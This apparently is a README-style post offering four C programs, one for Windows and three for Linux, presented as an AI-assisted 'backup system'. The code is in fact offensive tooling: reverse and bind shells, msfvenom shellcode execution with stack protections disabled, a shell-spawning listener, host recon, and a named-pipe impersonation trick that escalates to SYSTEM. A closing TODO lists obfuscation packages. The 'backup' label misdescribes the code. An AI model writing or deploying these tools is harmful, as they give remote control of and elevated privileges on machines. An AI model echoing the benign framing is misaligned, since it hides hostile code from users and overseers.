`this is a backup system, GPT helped me make it, its really good in VMS, so you dont need to install NC or RDP or something, you can just use this. Aand as we all know, Windows 's Admin isn't root as linux, System is more close to that, though. So GETSYS is from defcon related BUT ai assisted. Thanks for reading!`

# WINV1
```c
/* # WINDOWS+AI ASSISTED
 * Combined Windows Shell Utility
 * Compile: i686-w64-mingw32-gcc -o win_tool win_tool.c -lws2_32
 * Usage: win_tool.exe --choice=[reverse|bind|getsys] [args]
 */

#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#pragma comment(lib, "ws2_32")

void usage() {
    printf("Usage: win_tool.exe --choice=[reverse|bind|getsys] [args]\n");
    printf("Choices:\n");
    printf("  reverse <ip> <port> <command>\n");
    printf("  bind (executes msfvenom shellcode)\n");
    printf("  getsys (runs SYSTEM pipe technique)\n");
}

int do_reverse_shell(const char *ip, const char *port, const char *command) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(1, 0), &wsaData);
    sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    server.sin_family = AF_INET;
    inet_pton(AF_INET, ip, &server.sin_addr.s_addr);
    server.sin_port = htons(atoi(port));
    WSAConnect(sock, (const PSOCKADDR)&server, sizeof(server), NULL, NULL, NULL, NULL);
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    si.wShowWindow = SW_HIDE;
    si.cb = sizeof(si);

    CreateProcessA(NULL, command, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    return 0;
}

int do_bind_shell() {
    unsigned char windows_shellbindtcp[] = { /* shortened for brevity */ 0xfc, 0xe8, 0x82, 0x00 }; // ADD FULL SHELLCODE HERE
    DWORD oldProtect;
    VirtualProtect(windows_shellbindtcp, sizeof(windows_shellbindtcp), PAGE_EXECUTE_READWRITE, &oldProtect);
    ((void (*)(void))windows_shellbindtcp)();
    return 0;
}

DWORD WINAPI getsystem_thread(PVOID lpUnused) {
    PROCESS_INFORMATION pi;
    STARTUPINFO si = { 0 };
    si.cb = sizeof(si);
    char szRead[128] = { 0 };
    DWORD dwBytes = 0;
    HANDLE hToken;
    HANDLE hPipe;
    WCHAR cmd[MAX_PATH] = L"cmd.exe";

    const char *pipe = "\\\\.\\pipe\\getsystemyall";

    hPipe = CreateNamedPipeA(pipe, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT, 2, 0, 0, 0, NULL);
    if (!hPipe) return 1;

    while (!ConnectNamedPipe(hPipe, NULL)) {
        if (GetLastError() == ERROR_PIPE_CONNECTED) break;
    }
    if (!ReadFile(hPipe, szRead, 1, &dwBytes, NULL)) return 1;
    if (!ImpersonateNamedPipeClient(hPipe)) return 1;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) return 1;

    CreateProcessWithTokenW(hToken, 0, NULL, cmd, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);
    return 0;
}

int do_getsystem() {
    DWORD threadId;
    CreateThread(NULL, 0, getsystem_thread, NULL, 0, &threadId);
    system("sc create getsystemyall binPath= \"cmd.exe /c echo WUT > \\\\.\\pipe\\getsystemyall\"");
    system("sc start getsystemyall");
    system("sc delete getsystemyall");
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        usage();
        return 1;
    }

    if (strncmp(argv[1], "--choice=", 9) == 0) {
        const char *choice = argv[1] + 9;

        if (strcmp(choice, "reverse") == 0 && argc == 5)
            return do_reverse_shell(argv[2], argv[3], argv[4]);
        else if (strcmp(choice, "bind") == 0)
            return do_bind_shell();
        else if (strcmp(choice, "getsys") == 0)
            return do_getsystem();
    }

    usage();
    return 1;
}

```

# LINV1
```c
/* LINUX+AI ASSISTED
 * Combined Linux Shell Utility
 * Compile with: gcc -o linux_tool linux_tool.c -fno-stack-protector -z execstack -no-pie
 * Usage:
 *   ./linux_tool --choice=reverse <port> <ip> <binary>
 *   ./linux_tool --choice=shellcode
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

void usage() {
    printf("Usage: ./linux_tool --choice=[reverse|shellcode] [args]\n");
    printf("reverse <port> <ip> <binary>  : Connects back to host and executes shell\n");
    printf("shellcode                    : Executes static shellcode payload\n");
}

int do_reverse_shell(const char *port, const char *ip, const char *bin) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_port = htons(atoi(port));
    if (inet_pton(AF_INET, ip, &target.sin_addr) <= 0) {
        perror("inet_pton");
        return 1;
    }

    if (connect(sock, (struct sockaddr *)&target, sizeof(target)) < 0) {
        perror("connect");
        return 1;
    }

    for (int i = 0; i < 3; i++) dup2(sock, i);
    char * const argv[] = {(char *)bin, NULL};
    execve(bin, argv, NULL);
    perror("execve");
    return 1;
}

int do_shellcode() {
    // Example msfvenom payload: echo ABC && echo XYZ
    unsigned char sh_1[] = 
    "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52"
    "\x66\x68\x2d\x63\x54\x5e\x52\xe8\x15\x00\x00\x00\x65\x63\x68"
    "\x6f\x20\x41\x42\x43\x20\x26\x26\x20\x65\x63\x68\x6f\x20\x58"
    "\x59\x5a\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05";

    int (*exec_shellcode)() = (int(*)())sh_1;
    exec_shellcode();
    return 0;
}

int main(int argc, char **argv) {
    if (argc < 2) {
        usage();
        return 1;
    }

    if (strncmp(argv[1], "--choice=", 9) == 0) {
        const char *choice = argv[1] + 9;
        if (strcmp(choice, "reverse") == 0 && argc == 5)
            return do_reverse_shell(argv[2], argv[3], argv[4]);
        else if (strcmp(choice, "shellcode") == 0)
            return do_shellcode();
    }

    usage();
    return 1;
}
```

# LINV2
```c
/* LIN+AI ASSISTED
 * Combined Linux Shell Utility
 * Compile with: gcc -o linux_tool linux_tool.c -fno-stack-protector -z execstack -no-pie
 * Usage:
 *   ./linux_tool --choice=reverse <port> <ip> <binary>
 *   ./linux_tool --choice=shellcode
 *   ./linux_tool --choice=listen <port>
 *   ./linux_tool --choice=upload <localfile> <remote_path>
 *   ./linux_tool --choice=info
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <fcntl.h>

void usage() {
    printf("Usage: ./linux_tool --choice=[reverse|shellcode|listen|upload|info] [args]\n");
    printf("reverse <port> <ip> <binary>   : Connects back to host and executes shell\n");
    printf("shellcode                     : Executes static shellcode payload\n");
    printf("listen <port>                 : Listens on given port and spawns shell on connect\n");
    printf("upload <local> <remote>       : Uploads a file from local to remote path\n");
    printf("info                          : Prints basic system info\n");
}

int do_reverse_shell(const char *port, const char *ip, const char *bin) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { perror("socket"); return 1; }

    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_port = htons(atoi(port));
    if (inet_pton(AF_INET, ip, &target.sin_addr) <= 0) {
        perror("inet_pton"); return 1;
    }

    if (connect(sock, (struct sockaddr *)&target, sizeof(target)) < 0) {
        perror("connect"); return 1;
    }

    for (int i = 0; i < 3; i++) dup2(sock, i);
    char * const argv[] = {(char *)bin, NULL};
    execve(bin, argv, NULL);
    perror("execve"); return 1;
}

int do_shellcode() {
    unsigned char sh_1[] = 
    "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52"
    "\x66\x68\x2d\x63\x54\x5e\x52\xe8\x15\x00\x00\x00\x65\x63\x68"
    "\x6f\x20\x41\x42\x43\x20\x26\x26\x20\x65\x63\x68\x6f\x20\x58"
    "\x59\x5a\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05";

    int (*exec_shellcode)() = (int(*)())sh_1;
    exec_shellcode();
    return 0;
}

int do_listener(int port) {
    int sockfd, client;
    struct sockaddr_in server = {0};
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = INADDR_ANY;
    bind(sockfd, (struct sockaddr*)&server, sizeof(server));
    listen(sockfd, 1);
    client = accept(sockfd, NULL, NULL);
    for (int i = 0; i < 3; i++) dup2(client, i);
    execl("/bin/sh", "sh", NULL);
    return 0;
}

int do_upload(const char *src, const char *dst) {
    char buffer[1024];
    int in = open(src, O_RDONLY);
    if (in < 0) { perror("open src"); return 1; }
    int out = open(dst, O_CREAT | O_WRONLY, 0755);
    if (out < 0) { perror("open dst"); close(in); return 1; }
    ssize_t r;
    while ((r = read(in, buffer, sizeof(buffer))) > 0)
        write(out, buffer, r);
    close(in); close(out);
    return 0;
}

int do_info() {
    // please add more here depending on what you need the backup methodology to be doing
    system("uname -a");
    system("id");
    system("whoami");
    system("df -h");
    return 0;
}

int main(int argc, char **argv) {
    if (argc < 2) { usage(); return 1; }

    if (strncmp(argv[1], "--choice=", 9) == 0) {
        const char *choice = argv[1] + 9;
        if (strcmp(choice, "reverse") == 0 && argc == 5)
            return do_reverse_shell(argv[2], argv[3], argv[4]);
        else if (strcmp(choice, "shellcode") == 0)
            return do_shellcode();
        else if (strcmp(choice, "listen") == 0 && argc == 3)
            return do_listener(atoi(argv[2]));
        else if (strcmp(choice, "upload") == 0 && argc == 4)
            return do_upload(argv[2], argv[3]);
        else if (strcmp(choice, "info") == 0)
            return do_info();
    }

    usage();
    return 1;
}

```


# LINV3
```c
/* LIN+AI ASSIST
 * Combined Linux Shell Utility
 * Compile with: gcc -o linux_tool linux_tool.c -fno-stack-protector -z execstack -no-pie
 * Usage:
 *   ./linux_tool --choice=reverse <port> <ip> <binary>
 *   ./linux_tool --choice=shellcode
 *   ./linux_tool --choice=listen <port>
 *   ./linux_tool --choice=upload <localfile> <remote_path>
 *   ./linux_tool --choice=info
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <fcntl.h>

void usage() {
    printf("Usage: ./linux_tool --choice=[reverse|shellcode|listen|upload|info] [args]\n");
    printf("reverse <port> <ip> <binary>   : Connects back to host and executes shell\n");
    printf("shellcode                     : Executes static shellcode payload\n");
    printf("listen <port>                 : Listens on given port and spawns shell on connect\n");
    printf("upload <local> <remote>       : Uploads a file from local to remote path\n");
    printf("info                          : Prints basic system info\n");
}

int do_reverse_shell(const char *port, const char *ip, const char *bin) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { perror("socket"); return 1; }

    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_port = htons(atoi(port));
    if (inet_pton(AF_INET, ip, &target.sin_addr) <= 0) {
        perror("inet_pton"); return 1;
    }

    if (connect(sock, (struct sockaddr *)&target, sizeof(target)) < 0) {
        perror("connect"); return 1;
    }

    for (int i = 0; i < 3; i++) dup2(sock, i);
    char * const argv[] = {(char *)bin, NULL};
    execve(bin, argv, NULL);
    perror("execve"); return 1;
}

int do_shellcode() {
    unsigned char sh_1[] = 
    "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52"
    "\x66\x68\x2d\x63\x54\x5e\x52\xe8\x15\x00\x00\x00\x65\x63\x68"
    "\x6f\x20\x41\x42\x43\x20\x26\x26\x20\x65\x63\x68\x6f\x20\x58"
    "\x59\x5a\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05";

    int (*exec_shellcode)() = (int(*)())sh_1;
    exec_shellcode();
    return 0;
}

int do_listener(int port) {
    int sockfd, client;
    struct sockaddr_in server = {0};
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = INADDR_ANY;
    bind(sockfd, (struct sockaddr*)&server, sizeof(server));
    listen(sockfd, 1);
    client = accept(sockfd, NULL, NULL);
    for (int i = 0; i < 3; i++) dup2(client, i);
    execl("/bin/sh", "sh", NULL);
    return 0;
}

int do_upload(const char *src, const char *dst) {
    char buffer[1024];
    int in = open(src, O_RDONLY);
    if (in < 0) { perror("open src"); return 1; }
    int out = open(dst, O_CREAT | O_WRONLY, 0755);
    if (out < 0) { perror("open dst"); close(in); return 1; }
    ssize_t r;
    while ((r = read(in, buffer, sizeof(buffer))) > 0)
        write(out, buffer, r);
    close(in); close(out);
    return 0;
}

int do_info() {
    system("uname -a");
    system("id");
    system("whoami");
    system("df -h");
    return 0;
}

int main(int argc, char **argv) {
    if (argc < 2) { usage(); return 1; }

    if (strncmp(argv[1], "--choice=", 9) == 0) {
        const char *choice = argv[1] + 9;
        if (strcmp(choice, "reverse") == 0 && argc == 5)
            return do_reverse_shell(argv[2], argv[3], argv[4]);
        else if (strcmp(choice, "shellcode") == 0)
            return do_shellcode();
        else if (strcmp(choice, "listen") == 0 && argc == 3)
            return do_listener(atoi(argv[2]));
        else if (strcmp(choice, "upload") == 0 && argc == 4)
            return do_upload(argv[2], argv[3]);
        else if (strcmp(choice, "info") == 0)
            return do_info();
    }

    usage();
    return 1;
}

```









# TODO
- https://master.dl.sourceforge.net/project/libobfuscate/v2.00/libObfuscate.zip?viasf=1
- https://embeddedsw.net/zip/libObfuscate_release.zip
- https://embeddedsw.net/zip/libObfuscate_release.zip
- https://embeddedsw.net/zip/MultiObfuscator_release.zip
- https://embeddedsw.net/zip/OpenPuff_release.zip
